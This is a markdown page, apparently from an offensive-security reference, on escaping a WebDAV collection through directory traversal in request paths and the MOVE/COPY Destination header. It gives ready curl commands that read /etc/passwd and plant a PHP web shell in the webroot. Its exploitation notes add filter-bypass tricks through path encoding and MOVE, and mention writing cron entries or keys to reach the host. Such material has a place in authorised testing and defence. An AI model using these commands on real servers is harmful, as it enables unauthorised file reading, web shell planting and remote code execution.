---
title: "Directory traversal: escaping the intended WebDAV collection"
description: "WebDAV operations should stay within the configured collection, but servers that fail to canonicalise the request path or the Destination header allow traversal. Traversal in a GET/PROPFIND reads files outside the collection, and traversal in a PUT or the MOVE/COPY Destination writes outside it, placing files into web-executable or sensitive host paths."
keywords:
  - webdav traversal
  - destination header
  - move copy
  - put
  - path traversal
---

# Directory traversal

WebDAV verbs operate on paths, and where the server does not canonicalise and bound them, traversal escapes the intended collection. This cuts both ways. Traversal in a read (`GET`, `PROPFIND`) reaches files outside the WebDAV root for arbitrary read. More powerfully, traversal in a write, the `PUT` target path, or the `Destination` header of `MOVE`/`COPY`, lets the attacker choose where a file lands, placing it into a web-executable directory or a sensitive host path even when WebDAV is meant to confine writes to one collection.

```bash
# read traversal via GET/PROPFIND
curl -s --path-as-is http://<target>/dav/../../../../etc/passwd
curl -s -X PROPFIND --path-as-is 'http://<target>/dav/..%2f..%2f..%2fetc/' -H 'Depth:1' --data ''
# write traversal via PUT target or MOVE/COPY Destination header
curl -s -X PUT --path-as-is 'http://<target>/dav/../../var/www/html/s.php' --data '<?php system($_GET[c]);?>'
curl -s -X MOVE http://<target>/dav/s.txt -H 'Destination: http://<target>/../../var/www/html/s.php'
```

## Exploitation notes

- The `Destination` header on `MOVE`/`COPY` is a distinctive WebDAV write-traversal vector: upload an innocuous file, then MOVE it to a traversed, web-executable path, which also bypasses extension filters that only check the PUT path.
- Use `--path-as-is` and encoded traversal (`..%2f`) so the sequences survive to the server; filters are often bypassed by encoding.
- Write traversal is the high-impact case: dropping a script into the webroot is code execution, and writing a cron or key reaches the host; read traversal recovers configs and secrets.
- Impact is bounded by the server process's privileges and any OS-level confinement; combine with [PUT upload to RCE](put-upload-to-rce.md) for the execution step.

## References

- [RFC 4918: Destination header](https://datatracker.ietf.org/doc/html/rfc4918)
- [PortSwigger: path traversal](https://portswigger.net/web-security/file-path-traversal)
